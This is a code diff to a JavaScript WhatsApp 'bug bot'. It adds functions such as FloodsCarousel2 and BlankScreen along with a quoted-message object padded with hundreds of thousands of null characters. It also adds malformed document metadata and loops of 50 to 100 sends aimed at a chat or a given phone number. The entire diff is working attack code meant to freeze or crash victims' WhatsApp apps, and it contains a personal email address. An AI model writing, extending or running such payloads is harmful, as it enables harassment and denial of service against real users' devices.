@@ -2498,6 +2498,171 @@ await FrezeeMsg2(target)
 await OLDLOC(target, TypeNull)
 }
  }	    
+
+
+const NullNihBos = {
+      key: {
+        remoteJid: "p",
+        fromMe: false,
+        participant: "0@s.whatsapp.net",
+      },
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "✞Xᴄʜʀɪss Bot✞_",
+            format: "DEFAULT",
+          },
+          nativeFlowResponseMessage: {
+            name: "galaxy_message",
+            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"✞𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑✞\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"phoenixgibson007@gmail.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
+            version: 3,
+          },
+        },
+      },
+    };
+
+
+  async function FloodsCarousel2(target, Ptcp = true) {
+      const header = proto.Message.InteractiveMessage.Header.create({
+        ...(await prepareWAMessageMedia(
+          { image: { url: "https://ibb.co/LZGzx5R" } },
+          { upload: XeonBotInc.waUploadToServer }
+        )),
+        title: "【 𖤍 】 𝙻𝙾𝚁𝙳 Xᴄʜʀɪss" + "\u0000".repeat(100000),
+        subtitle: "✞Xᴄʜʀɪss Bot✞_",
+        hasMediaAttachment: true,
+      });
+
+      const body = {
+        text: "\u0000" + "\u0000".repeat(90000),
+      };
+
+      // Example carousel content
+      const carouselMessage = {
+        sections: [
+          {
+            title: " 【 𖤍 】 𝙻𝙾𝚁𝙳 Xᴄʜʀɪss",
+            rows: [
+              {
+                title: "【 𖤍 】 𝙻𝙾𝚁𝙳 Xᴄʜʀɪss",
+                description: "\u0000".repeat(55555),
+                rowId: "\u0000".repeat(55555),
+              },
+              {
+                title: "★",
+                description: "\u0000".repeat(55555),
+                rowId: "\u0000".repeat(55555),
+              },
+            ],
+          },
+          {
+            title: " ✞Xᴄʜʀɪss Bot✞",
+            rows: [
+              {
+                title: "✞𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐎𝐑✞",
+                description: "\u0000".repeat(55555),
+                rowId: "\u0000".repeat(55555),
+              },
+              {
+                title: "★",
+                description: "\u0000".repeat(55555),
+                rowId: "\u0000".repeat(55555),
+              },
+            ],
+          },
+        ],
+      };
+
+      await XeonBotInc.relayMessage(
+        target,
+        {
+          ephemeralMessage: {
+            message: {
+              interactiveMessage: {
+                header: header,
+                body: body,
+                carouselMessage: carouselMessage,
+              },
+            },
+          },
+        },
+        Ptcp
+          ? {
+              participant: {
+                jid: target,
+                quoted: NullNihBos
+              },
+            }
+          : {}
+      );
+  }
+
+
+   async function BlankScreen(target, Ptcp = false) {
+        let virtex = "【 𖤍 】 𝙻𝙾𝚁𝙳 Xᴄʜʀɪss" + "\u0000".repeat(90000);
+			await XeonBotInc.relayMessage(target, {
+					ephemeralMessage: {
+						message: {
+							interactiveMessage: {
+								header: {
+									documentMessage: {
+										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+										fileLength: "9999999999999",
+										pageCount: 1316134911,
+										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+										fileName: "♡𓆩ʟᴏʀᴅ ⸙ꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋꠋȾⱥīɍⱥًَُْ𝅯𝅯۪ؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒؒ",
+										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+										mediaKeyTimestamp: "1726867151",
+										contactVcard: true,
+										jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
+									},
+									hasMediaAttachment: true,
+								},
+								body: {
+									text: virtex,
+								},
+								nativeFlowMessage: {},
+								contextInfo: {
+								mentionedJid: ["0@s.whatsapp.net"],
+									forwardingScore: 1,
+									isForwarded: true,
+									fromMe: false,
+									participant: "0@s.whatsapp.net",
+									remoteJid: "status@broadcast",
+									quotedMessage: {
+										documentMessage: {
+											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+											fileLength: "9999999999999",
+											pageCount: 1316134911,
+											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+											fileName: "lol",
+											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+											mediaKeyTimestamp: "1724474503",
+											contactVcard: true,
+											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+				Ptcp ? {
+					participant: {
+						jid: target
+					}
+				} : { quoted: NullNihBos }
+			);
+   }
 switch (command) {
 case 'cios2': {
 if (!isPremium) return replygcxeon(mess.prem)
@@ -2517,9 +2682,15 @@ if (!isPremium) return replygcxeon(mess.prem)
 let target = m.chat
 for (let i = 0; i < 100; i++) {
 await caltx(target, true)
+await callbg(target)
+await FloodsCarousel2(target, Ptcp = true)
+await BlankScreen(target, Ptcp = true)
 await sleep(10)
 await freezegc(target, true)
 await caltx(target, true)
+await callbg(target)
+await FloodsCarousel2(target, Ptcp = true)
+await BlankScreen(target, Ptcp = true)
 await sleep(10)
 await freezegc(target, true)
 }
@@ -2566,18 +2737,30 @@ if (!q) return replygcxeon(`Use ${prefix+command} 91xxxxxxxxxx\nExample ${prefix
 let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 await loading()
 for (let i = 0; i < 70; i++) {
+await FloodsCarousel2(target, Ptcp = true)
+await BlankScreen(target, Ptcp = true)
 await freezekamoflase(target, true)
 await newfreezebg(target, true)
 await nulltag(target, true)
 await NewsletterZap(target, true)
 await freezeui(target, true)
 await freezeuii(target, true)
+await sleep(10000)
+await callp(target, )
+await gall(target, xbug2, 1020000)
+await FloodsCarousel2(target, Ptcp = true)
+await BlankScreen(target, Ptcp = true)
 await OLDLOC(target, TypeNull)
 await DocSystem(target)
 await DocSystem2(target)
 await DocSystem3(target)
 await EncryptMessage(target)
 await FrezeeMsg1(target)
+await sleep(10000)
+await callp(target, )
+await gall(target, xbug2, 1020000)
+await FloodsCarousel2(target, Ptcp = true)
+await BlankScreen(target, Ptcp = true)
 await FrezeeMsg2(target)
 await OLDLOC(target, TypeNull)
 }
@@ -2606,12 +2789,17 @@ if (!q) return replygcxeon('Provide argument')
 let target = m.chat
 await replygcxeon(`✞Xᴄʜʀɪss Bot✞`)
 for (let i = 0; i < 50; i++) {
+await FloodsCarousel2(target, Ptcp = true)
+await BlankScreen(target, Ptcp = true)
 await BugPayment(target)
 await BugFrezee(target)
 await OLDLOC(target, TypeNull) 
 await callp(target, )
 await gall(target, xbug2, 1020000)
 await galx(target, Ptcp = true)
+await callDoc(XeonBotInc, target)
+await FloodsCarousel2(target, Ptcp = true)
+await BlankScreen(target, Ptcp = true)
 await TrashSystem(target, xeonThm, Ptcp = true)
 await StuckNull(target, xeonThm, Ptcp = true) 
 await StuckSql(target, xeonThm, Ptcp = true)
@@ -2619,6 +2807,8 @@ await PayMent(target)
 await beta(betaq, target)
 await caros(target, Ptcp = true)
 await galx(target, Ptcp = true)
+await FloodsCarousel2(target, Ptcp = true)
+await BlankScreen(target, Ptcp = true)
 await coresix(target, "XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱", 1020000, true); 
 await XeonBotInc.sendMessage(target, { text: `XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱` }, {quoted: xbug2})
 await sleep(10000)
